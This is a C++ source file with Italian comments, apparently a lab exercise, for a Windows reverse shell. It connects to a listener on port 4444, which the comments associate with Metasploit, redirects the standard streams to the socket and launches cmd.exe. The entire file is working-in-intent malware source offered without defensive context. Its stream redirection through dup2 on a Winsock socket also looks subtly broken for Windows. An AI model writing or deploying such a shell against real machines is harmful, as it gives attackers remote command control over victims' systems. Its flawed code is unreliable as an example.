#include <iostream>
#include <winsock2.h>
#include <windows.h>

int main() {
    // Inizzializzazione dei socket di windows con wsadata
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[-] Inizzializzazione WSAStartup fallita!" << std::endl;
        return 1;
    }

    // Creazione del socket
    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET) {
        std::cerr << "[-] Creazione del socket fallita!" << std::endl;
        return 1;
    }

    // Definizione del server della porta e dell Ip
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444); // Porta della metasploitable
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Il nostro indirizzo ip

    // Connessione con il server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        std::cerr << "[-] Connessione fallita!" << std::endl;
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    // Reindirizzamento degli input e degli output
    dup2(sockfd, 0); // STDIN
    dup2(sockfd, 1); // STDOUT
    dup2(sockfd, 2); // STDERR

    // Creazione di una Shell
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Avvio della Shell
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "[-] Creazione Shell fallita!" << std::endl;
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    // Wait for the shell to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close handles
    closesocket(sockfd);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Cleanup Winsock
    WSACleanup();

    return 0;
}
